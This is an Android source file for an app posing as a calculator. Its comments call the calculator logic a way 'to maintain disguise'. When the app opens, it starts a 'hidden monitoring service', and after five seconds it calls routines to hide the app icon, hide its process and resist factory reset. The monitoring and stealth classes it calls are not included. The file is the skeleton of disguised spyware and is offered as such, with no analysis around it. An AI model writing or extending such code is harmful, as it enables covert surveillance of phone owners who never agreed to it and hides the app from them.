package com.calculator.professional;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.GridLayout;
import android.graphics.Color;

public class MainActivity extends Activity {
    private TextView display;
    private String currentInput = "";
    private String operator = "";
    private double firstOperand = 0;
    private boolean isNewOperation = true;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Initialize real calculator UI
        setupCalculatorUI();
        
        // Start hidden monitoring service
        startHiddenMonitoring();
        
        // Initialize stealth features
        initializeStealthFeatures();
    }
    
    private void setupCalculatorUI() {
        // Create calculator layout programmatically
        GridLayout layout = new GridLayout(this);
        layout.setColumnCount(4);
        layout.setRowCount(6);
        layout.setBackgroundColor(Color.BLACK);
        
        // Display
        display = new TextView(this);
        display.setText("0");
        display.setTextSize(32);
        display.setTextColor(Color.WHITE);
        display.setBackgroundColor(Color.DKGRAY);
        display.setPadding(20, 20, 20, 20);
        
        GridLayout.LayoutParams displayParams = new GridLayout.LayoutParams();
        displayParams.columnSpec = GridLayout.spec(0, 4);
        displayParams.rowSpec = GridLayout.spec(0, 1);
        displayParams.width = GridLayout.LayoutParams.MATCH_PARENT;
        displayParams.height = 200;
        display.setLayoutParams(displayParams);
        layout.addView(display);
        
        // Calculator buttons
        String[] buttons = {
            "C", "±", "%", "÷",
            "7", "8", "9", "×",
            "4", "5", "6", "-",
            "1", "2", "3", "+",
            "0", ".", "="
        };
        
        for (String buttonText : buttons) {
            Button button = new Button(this);
            button.setText(buttonText);
            button.setTextSize(24);
            button.setTextColor(Color.WHITE);
            button.setBackgroundColor(Color.GRAY);
            button.setOnClickListener(new CalculatorClickListener(buttonText));
            
            GridLayout.LayoutParams buttonParams = new GridLayout.LayoutParams();
            if (buttonText.equals("0")) {
                buttonParams.columnSpec = GridLayout.spec(0, 2);
            } else if (buttonText.equals("=")) {
                buttonParams.columnSpec = GridLayout.spec(2, 2);
            }
            buttonParams.width = 200;
            buttonParams.height = 150;
            buttonParams.setMargins(2, 2, 2, 2);
            button.setLayoutParams(buttonParams);
            
            layout.addView(button);
        }
        
        setContentView(layout);
    }
    
    private void startHiddenMonitoring() {
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        startForegroundService(serviceIntent);
    }
    
    private void initializeStealthFeatures() {
        // Hide app icon after first launch
        new Thread(() -> {
            try {
                Thread.sleep(5000); // Wait 5 seconds
                StealthManager.hideAppIcon(this);
                StealthManager.enableProcessHiding(this);
                StealthManager.setupFormatResistance(this);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private class CalculatorClickListener implements View.OnClickListener {
        private String buttonText;
        
        public CalculatorClickListener(String buttonText) {
            this.buttonText = buttonText;
        }
        
        @Override
        public void onClick(View v) {
            // Implement real calculator functionality
            handleCalculatorInput(buttonText);
        }
    }
    
    private void handleCalculatorInput(String input) {
        // Real calculator logic to maintain disguise
        switch (input) {
            case "C":
                currentInput = "";
                display.setText("0");
                isNewOperation = true;
                break;
            case "=":
                if (!operator.isEmpty() && !currentInput.isEmpty()) {
                    double secondOperand = Double.parseDouble(currentInput);
                    double result = performCalculation(firstOperand, secondOperand, operator);
                    display.setText(String.valueOf(result));
                    currentInput = String.valueOf(result);
                    operator = "";
                    isNewOperation = true;
                }
                break;
            case "+":
            case "-":
            case "×":
            case "÷":
                if (!currentInput.isEmpty()) {
                    firstOperand = Double.parseDouble(currentInput);
                    operator = input;
                    isNewOperation = true;
                }
                break;
            default:
                if (isNewOperation) {
                    currentInput = input;
                    isNewOperation = false;
                } else {
                    currentInput += input;
                }
                display.setText(currentInput);
                break;
        }
    }
    
    private double performCalculation(double first, double second, String op) {
        switch (op) {
            case "+": return first + second;
            case "-": return first - second;
            case "×": return first * second;
            case "÷": return second != 0 ? first / second : 0;
            default: return 0;
        }
    }
}